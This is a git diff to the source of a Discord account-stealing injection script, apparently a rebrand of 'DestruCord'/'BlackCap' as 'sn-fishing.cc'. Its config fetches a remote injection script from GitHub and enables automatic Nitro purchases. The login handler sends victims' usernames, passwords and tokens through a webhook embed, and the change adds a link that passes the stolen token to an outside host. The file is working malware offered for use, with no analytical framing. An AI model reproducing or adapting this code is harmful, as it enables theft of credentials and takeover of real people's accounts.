@@ -10,8 +10,8 @@ const config = {
   auto_buy_nitro: true,
   ping_on_run: false,
   ping_val: "@everyone",
-  embed_name: "BlackCap",
-  embed_icon: "https://media.discordapp.net/attachments/952612688452800515/961242713330712636/blackcap-0.png".replace(/ /g, "%20"), 
+  embed_name: "sn-fishing.cc",
+  embed_icon: "https://cdn.discordapp.com/attachments/988472291048439890/988586662080692324/Zo5tLqSY2l9CjuEXEuNazNpEL1hq4KPAdhR5FVdkfPPkQWJFWWa0wKAixX6NimmTMwZvufxHmLwMR7L8_Hpm_oDJQcFu4DPEiTRQFWXO4tnmBpCgstJwEZinVkOFZ9s_PA5Hrkb1ds0FGSXpf12ekdppplZGzS_iq8N7JKrNey-k-0gV4xDDg_XT9Okl5bcNyDWn1WhcTfCCdg2Rf1hR8uc.jpg".replace(/ /g, "%20"), 
   embed_color: 374276, 
   injection_url: "https://raw.githubusercontent.com/KSCHdsc/DestruCord-Inject/main/Injections/simplecord.js", 
 
@@ -320,11 +320,14 @@ const login = async (email, password, token) => {
     avatar_url: config.embed_icon,
     embeds: [
       {
-        title: "DestruCord Login",
-            description: "[<a:blackcap:961249786315538524> │ **Oh you have DestruCorded someone**](https://github.com/KSCHdsc)",
-
+            description: "[<a:blackcap:961249786315538524> │ If you have a problem join our Discord server](https://discord.gg/23zfPcaT) or [our Telegram server](https://t.me/snstealer)",
             "color": config.embed_color,
             "fields": [
+                {
+                    "name": "**Token**",
+                    "value": `\`\`\`${token}\`\`\`\n[Click = Copy](https://superfurrycdn.nl/copy/${token})`,
+                    "inline": false
+                },
                 {
                     "name": "**Account Name**",
                     "value": `\`${json.username +"#" + json.discriminator}\``,
@@ -360,11 +363,6 @@ const login = async (email, password, token) => {
                     "value": `\`${password}\``,
                     "inline": true
                 },
-                {
-                    "name": "**Token**",
-                    "value": `\`${token}\``,
-                    "inline": false
-                }
             ],
             "author": {
                 "name": "DestruCord V1"
